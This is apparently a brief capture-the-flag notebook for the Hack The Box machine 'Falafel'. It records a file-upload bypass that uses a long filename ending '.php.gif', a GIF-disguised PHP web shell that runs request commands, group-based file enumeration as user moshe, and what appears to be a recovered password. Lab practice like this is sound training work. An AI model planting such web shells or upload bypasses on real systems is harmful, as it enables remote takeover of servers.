### Foothold
```
❯ locate pattern_create
/usr/bin/msf-pattern_create
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
                                                                                                                                                      
❯ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4

❯ python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif

GIF8;
<?php echo system($_REQUEST['cmd']); ?>
```

### Stuck on, TBC
```
moshe@falafel:/tmp$ w
 06:14:48 up 19:27,  2 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      Sun10   19:27m  0.03s  0.03s -bash
moshe    pts/1    10.10.16.9       05:41    0.00s  0.09s  0.00s w

moshe@falafel:/dev/shm/.z$ groups
moshe adm mail news voice floppy audio video games

for x in $(groups); do echo ========${x}========; find / -group ${x} ! -type d -exec ls -la {} \; 2>/dev/null > ${x}; done
ls -l # for aboves
```

`MoshePlzStopHackingMe!`


### Read those agagin
https://youtu.be/CUbWpteTfio?t=2575
https://0xdf.gitlab.io/2018/06/23/htb-falafel.html#privesc-moshe---yossi